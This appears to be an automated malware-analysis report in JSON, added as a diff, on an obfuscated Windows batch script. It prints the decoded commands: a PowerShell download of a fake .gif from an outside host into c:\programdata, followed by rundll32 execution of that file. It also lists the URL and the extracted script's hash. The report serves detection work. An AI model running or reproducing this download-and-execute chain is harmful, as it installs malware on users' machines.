@@ -1,0 +1,138 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 950,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "[{\"Command [trun.]\": \"%rfptoz%%iwqnoh%%kmbflw%%gkboij%%jsmwxd%%jseful%%dpgaru%%gkboij%%hcbszt%%hcbszt% %knfogq%%tnkoyi%%hm\", \"Normalized [trun.]\": \"powershell invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\\\programdat\"}, {\"Command [trun.]\": \"%jsmwxd%%mhilqc%%tnkoyi%%xoygqw%%hcbszt%%hcbszt%32 %ptjeix%:\\\\%rfptoz%%jsmwxd%%iwqnoh%%ujkpla%%jsmwxd\", \"Normalized\": \"rundll32 c:\\\\programdata\\\\PNwK.jpg init\"}, {\"Command\": \"%gkboij%%yrukzs%%knfogq%%vxojht%\", \"Normalized\": \"exit\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 3,
+          "score": 250,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Execution of variable content",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"Count\": 85, \"Command [trun.]\": \"%rfptoz%%iwqnoh%%kmbflw%%gkboij%%jsmwxd%%jseful%%dpgaru%%gkboij%%hcbszt%%hcbszt% %knfogq%%tnkoyi%%hm\", \"Normalized [trun.]\": \"powershell invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\\\programdat\"}, {\"Count\": 26, \"Command [trun.]\": \"%jsmwxd%%mhilqc%%tnkoyi%%xoygqw%%hcbszt%%hcbszt%32 %ptjeix%:\\\\%rfptoz%%jsmwxd%%iwqnoh%%ujkpla%%jsmwxd\", \"Normalized\": \"rundll32 c:\\\\programdata\\\\PNwK.jpg init\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 200,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Multiple variable were used on the same line",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[{\"URL\": \"https://ramdungexpedition.com/image/017.gif\", \"Destination\": \"c:\\\\programdata\\\\PNwK.jpg\", \"Command [trun.]\": \"powershell.exe  invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\\\progr\"}]",
+        "body_format": "TABLE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {
+          "network": {
+            "static": {
+              "uri": [
+                "https://ramdungexpedition.com/image/017.gif"
+              ]
+            }
+          }
+        },
+        "title_text": "External file download in batch script",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "[[\"TABLE\", [{\"Command\": \"rundll32 c:\\\\programdata\\\\PNwK.jpg init\"}]], [\"TEXT\", \"c:\\\\programdata\\\\PNwK.jpg was downloaded from https://ramdungexpedition.com/image/017.gif\"]]",
+        "body_format": "MULTI",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 10,
+          "score": 500,
+          "score_map": {},
+          "signatures": {
+            "internet_download": 1
+          }
+        },
+        "tags": {
+          "network": {
+            "static": {
+              "uri": [
+                "https://ramdungexpedition.com/image/017.gif"
+              ]
+            }
+          }
+        },
+        "title_text": "Rundll32 execution",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "03431f102f_deobfuscated.bat",
+        "sha256": "03431f102f23d66fdddfb925df143a076e7d64e9a699feba1d905bda4feede7e"
+      }
+    ],
+    "supplementary": []
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 3,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 4,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 10,
+        "signatures": [
+          "internet_download"
+        ]
+      }
+    ],
+    "tags": {
+      "network.static.uri": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "https://ramdungexpedition.com/image/017.gif"
+        },
+        {
+          "heur_id": 10,
+          "signatures": [
+            "internet_download"
+          ],
+          "value": "https://ramdungexpedition.com/image/017.gif"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
